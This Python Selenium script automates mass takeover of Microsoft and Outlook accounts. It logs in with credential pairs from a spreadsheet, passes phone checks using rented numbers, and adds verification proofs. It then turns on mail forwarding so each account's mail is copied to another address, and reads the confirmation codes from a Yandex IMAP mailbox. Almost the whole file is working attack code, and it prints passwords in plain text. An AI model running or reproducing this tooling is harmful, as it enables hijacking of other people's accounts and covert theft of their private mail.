print("STARTING CODE")
import argparse
import time
import os

import pandas as pd
from datetime import datetime
from imap_tools import MailBox, AND
from requests_html import HTML
from get_numberPhone_and_code import get_code, get_phone
from read_mail_using_code import get_verify_code

from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common import TimeoutException
from selenium.webdriver.firefox.options import Options

parser = argparse.ArgumentParser()

parser.add_argument('--data', type=str, default="forwarding_mail_data.xlsx")
args = parser.parse_args()

excel_data = pd.read_excel(args.data, "Data")

excel_data2 = pd.read_excel(args.data, "Mail_Main")
MAIN_EMAIL = excel_data2['main_email'][0]
MAIN_EMAIL_PASSWORD = excel_data2['main_password'][0]

print("MAIN_EMAIL: ", MAIN_EMAIL)
print("MAIN_EMAIL_PASSWORD: ", MAIN_EMAIL_PASSWORD)

def process():

    data = pd.DataFrame(excel_data, columns=['email', 'password', 'email_protect'])
    results = []
    for ind, row in data.iterrows():
        email = row['email']
        password = row['password']
        email_protect = row['email_protect']
        print("email: ", email)
        print("password: ", password)
        print("email_protect: ", email_protect)

        # chrome_options = webdriver.ChromeOptions()
        # chrome_options.add_argument("--incognito")
        # chrome_options.add_argument("--start-maximized")
        # browser = webdriver.Chrome(executable_path="chromedriver.exe", chrome_options=chrome_options)
        # browser.get('https://login.live.com')


        # firefox_options = webdriver.FirefoxOptions()
        # firefox_options.add_argument("--private")
        # firefox_options.add_argument("--lang=en-au")
        # browser = webdriver.Firefox(executable_path="geckodriver.exe", options=firefox_options)
        # browser.get('https://login.live.com')

        profile = webdriver.FirefoxProfile()
        profile.set_preference("browser.cache.disk.enable", False)
        profile.set_preference("browser.cache.memory.enable", False)
        profile.set_preference("browser.cache.offline.enable", False)
        profile.set_preference("network.http.use-cache", False)
        profile.set_preference('intl.accept_languages', 'en-US, en')
        profile.set_preference('permissions.default.image', 2)
        profile.set_preference('dom.ipc.plugins.enabled.libflashplayer.so', 'false')

        options = Options()
        options.headless = False
        browser = webdriver.Firefox(firefox_profile=profile, options=options)
        browser.get('https://login.live.com')

        # login email
        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "i0116"))).send_keys(email)
        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()
        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "i0118"))).send_keys(password)
        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()

        def process_code_verify(phone_num_id, nums0=0, nums1=0):
            try:
                time.sleep(3)
                phone_code_verify, reponse_code = get_code(phone_num_id)
                print("nums get phone111: ", nums0, nums1, phone_num_id, reponse_code)
                if reponse_code == 0:
                    return phone_code_verify
                if nums1 == 2:
                    return None
                if reponse_code == -2:
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input"))).clear()
                    time.sleep(3)
                    phone_num1, phone_num_id1 = get_phone()
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input"))).send_keys(phone_num1)
                    browser.find_element_by_xpath("//*[text()='Send code']").click()
                    return process_code_verify(phone_num_id1, nums0, nums1 + 1)
                if reponse_code == -1:
                    if nums0 == 20:
                        return process_code_verify(phone_num_id, 0, nums1+1)
                    return process_code_verify(phone_num_id, nums0+1, nums1)

            except Exception as e:
                print("Exception when process_code_verify: ", e)
                return None

        def process_code_verify23(phone_num_id, nums0=0, nums1=0):

            try:
                time.sleep(3)
                phone_code_verify, reponse_code = get_code(phone_num_id)
                print("nums get phone2323: ", nums0, nums1, phone_num_id, reponse_code)

                if reponse_code == 0:
                    return phone_code_verify
                if nums1 == 2:
                    return None
                if reponse_code == -2:

                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iBtn_closet"))).click()
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idAddPhoneAliasLink"))).click()
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "DisplayPhoneCountryISO"))).click()
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//select/option[@value='VN']"))).click()
                    phone_num1, phone_num_id1 = get_phone()
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "DisplayPhoneNumber"))).send_keys(phone_num1)
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()

                    return process_code_verify23(phone_num_id1, nums0, nums1 + 1)
                if reponse_code == -1:
                    if nums0 == 20:
                        return process_code_verify23(phone_num_id, 0, nums1 + 1)
                    return process_code_verify23(phone_num_id, nums0 + 1, nums1)
            except Exception as e:
                print("Exception when process_code_verify: ", e)
                return None


        try:
            # gap truong hop 1 chua lam
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "StartAction"))).click()
            print("gap truong hop 1 chua lam")
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//select/option[@value='VN']"))).click()
            phone_num, phone_num_id = get_phone()
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input"))).send_keys(phone_num)
            time.sleep(2)
            browser.find_element_by_xpath("//*[text()='Send code']").click()

            phone_code_verify = process_code_verify(phone_num_id, 0, 0)
            print("phone_code_verify: ", phone_code_verify)
            if phone_code_verify is None:
                browser.close()
                results.append([email, password, email_protect, "Khong thue duoc sdt"])
                continue

            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@aria-label='Enter the access code']"))).send_keys(phone_code_verify)
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "ProofAction"))).click()
            time.sleep(5)

            try:
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "FinishAction"))).click()
            except Exception as e:
                pass
            try:
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idBtn_Back"))).click()
            except Exception as e:
                pass

            time.sleep(3)
            browser.get("https://outlook.live.com/mail/0/options/mail/layout")
            try:
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "EmailAddress"))).send_keys(email_protect)
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iNext"))).click()

                # get code
                while 1:
                    code = get_verify_code(mail=email_protect, seen=False)
                    print("0000000000", code)
                    if code is not None:
                        break
                    time.sleep(2)
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(code)
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iNext"))).click()
            except Exception as e:
                pass

            time.sleep(3)
            browser.get("https://outlook.live.com/mail/0/options/mail/layout")
            try:
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
            except Exception as e:
                pass
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Forwarding']"))).click()

            try:
                try:
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idDiv_SAOTCS_Proofs"))).click()
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCS_ProofConfirmation"))).send_keys(email_protect)
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCS_SendCode"))).click()
                    while 1:
                        code1 = get_verify_code(mail=email_protect, seen=False)
                        print("CODE_MAIL_PROTECT: ", code1)
                        if code1 is not None:
                            break
                        time.sleep(2)
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCC_OTC"))).send_keys(code1)
                    WebDriverWait(browser, 10).until(
                        EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCC_Continue"))).click()
                    try:
                        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iCancel"))).click()
                    except Exception as e:
                        pass

                except Exception as e:
                    pass

                try:
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
                except Exception as e:
                    pass

                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Enable forwarding']"))).click()
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Keep a copy of forwarded messages']"))).click()
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys(email_protect.split("@")[0])
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("@")
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("m")
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("i")
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("n")
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("h")
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys(".")
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("l")
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("i")
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("v")
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("e")

                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Save']"))).click()
                status = "success"
                print("Lam xong truong hop 1: ", email_protect)
            except Exception as e:
                print("Exception1: ", e)
                status = "Error: web can't loaded"
                print("Truong hop 1 bi loi: ", email_protect)

        except:

            # gap truong hop 2 hoac 3
            browser.get("https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com&refp=profile")
            try:
                # gap mail da lam cua tat ca cac truong hop
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idDiv_SAOTCS_Proofs"))).click()
                print("gap truong hop mail da lam")
                status = "forwarded"
            except Exception as e:
                # gap truong hop 2 hoac 3 chua lam
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "EmailAddress"))).send_keys(email_protect)
                print("gap truong hop 2 hoac 3 chua lam")
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iNext"))).click()
                while 1:
                    code = get_verify_code(mail=email_protect, seen=False)
                    print("2222222222", code)
                    if code is not None:
                        break
                    time.sleep(2)
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(code)
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iNext"))).click()
                try:##########
                    WebDriverWait(browser, 10).until(
                        EC.element_to_be_clickable((By.ID, "idDiv_SAOTCS_Proofs"))).click()
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCS_ProofConfirmation"))).send_keys(email_protect)
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCS_SendCode"))).click()
                    while 1:
                        code1 = get_verify_code(mail=email_protect, seen=False)
                        print("3333333333", code1)
                        if code1 is not None:
                            break
                        time.sleep(2)
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCC_OTC"))).send_keys(code1)
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCC_Continue"))).click()
                    try:
                        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iCancel"))).click()
                    except Exception as e:
                        pass
                except Exception as e:
                    pass

                time.sleep(3)
                browser.get("https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com&refp=profile")
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idAddPhoneAliasLink"))).click()
                WebDriverWait(browser, 10).until(
                    EC.element_to_be_clickable((By.ID, "DisplayPhoneCountryISO"))).click()
                WebDriverWait(browser, 10).until(
                    EC.element_to_be_clickable((By.XPATH, "//select/option[@value='VN']"))).click()
                phone_num, phone_num_id = get_phone()
                print("phone_num: ", phone_num, phone_num_id)
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "DisplayPhoneNumber"))).send_keys(phone_num)  # nhap sdt
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()

                phone_code_verify = process_code_verify23(phone_num_id, 0, 0)
                if phone_code_verify is None:
                    browser.close()
                    results.append([email, password, email_protect, "Khong thue duoc sdt"])
                    continue

                WebDriverWait(browser, 120).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(phone_code_verify)  # nhap code
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()

                time.sleep(5)

                browser.close()

                profile = webdriver.FirefoxProfile()
                profile.set_preference("browser.cache.disk.enable", False)
                profile.set_preference("browser.cache.memory.enable", False)
                profile.set_preference("browser.cache.offline.enable", False)
                profile.set_preference("network.http.use-cache", False)
                profile.set_preference('intl.accept_languages', 'en-US, en')
                profile.set_preference('intl.accept_languages', 'en-US, en')
                profile.set_preference('permissions.default.image', 2)

                options = Options()
                options.headless = False
                browser = webdriver.Firefox(firefox_profile=profile, options=options)
                browser.get('https://login.live.com')

                # login email

                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "i0116"))).send_keys(email)
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "i0118"))).send_keys(password)
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()
                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idBtn_Back"))).click()

                time.sleep(3)
                browser.get("https://outlook.live.com/mail/0/options/mail/layout")

                WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Forwarding']"))).click()

                try:########
                    WebDriverWait(browser, 10).until(
                        EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
                except Exception as e:
                    pass

                try:
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idDiv_SAOTCS_Proofs"))).click()
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCS_ProofConfirmation"))).send_keys(email_protect)
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCS_SendCode"))).click()
                    while 1:
                        code = get_verify_code(mail=email_protect, seen=False)
                        print("0000000000", code)
                        if code is not None:
                            break
                        time.sleep(2)

                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCC_OTC"))).send_keys(code)
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCC_Continue"))).click()
                    try:
                        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iCancel"))).click()
                    except Exception as e:
                        pass
                except Exception as e:
                    pass

                try:
                    try:
                        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idDiv_SAOTCS_Proofs"))).click()
                        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCS_ProofConfirmation"))).send_keys(email_protect)
                        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCS_SendCode"))).click()
                        while 1:
                            code = get_verify_code(mail=email_protect, seen=False)
                            print("0000000000", code)
                            if code is not None:
                                break
                            time.sleep(2)

                        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCC_OTC"))).send_keys(code)
                        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCC_Continue"))).click()
                        try:
                            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iCancel"))).click()
                        except Exception as e:
                            pass
                    except Exception as e:
                        pass

                    try:
                        WebDriverWait(browser, 10).until(
                            EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
                    except Exception as e:
                        pass

                    try:
                        WebDriverWait(browser, 10).until(
                            EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
                    except Exception as e:
                        pass

                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Enable forwarding']"))).click()
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Keep a copy of forwarded messages']"))).click()
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys(email_protect.split("@")[0])
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("@")
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("m")
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("i")
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("n")
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("h")
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys(".")
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("l")
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("i")
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("v")
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("e")

                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Save']"))).click()

                    time.sleep(3)
                    browser.get("https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com&refp=profile")
                    time.sleep(3)
                    browser.get("https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com&refp=profile")
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idRemoveAssocPhone"))).click()
                    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()
                    status = "success"
                    print("Lam xong truong hop 2-3: ", email_protect)

                except Exception as e:
                    print("Exception23: ", e)
                    status = "Error: web can't loaded"
                    print("Truong hop 2-3 bi loi", email)


        browser.close()
        results.append([email, password, email_protect, status])
        time.sleep(5)
    results_df = pd.DataFrame(results, columns=["email", "password", "email_protect", "status"])
    results_df.to_excel(f"results_{time.time()}.xlsx")


def get_verify_code(mail: str, seen: bool):
    date = datetime.date(datetime.now())
    with MailBox('imap.yandex.com').login(MAIN_EMAIL, MAIN_EMAIL_PASSWORD) as mailbox:
        for msg in mailbox.fetch(criteria=AND(seen=seen, to=mail), reverse=True):
            page = HTML(html=str(msg.html))
            codes = page.xpath('//tr/td/span//text()')
            if len(codes):
                return codes[0]
            else:
                return -1


if __name__ == '__main__':
    process()

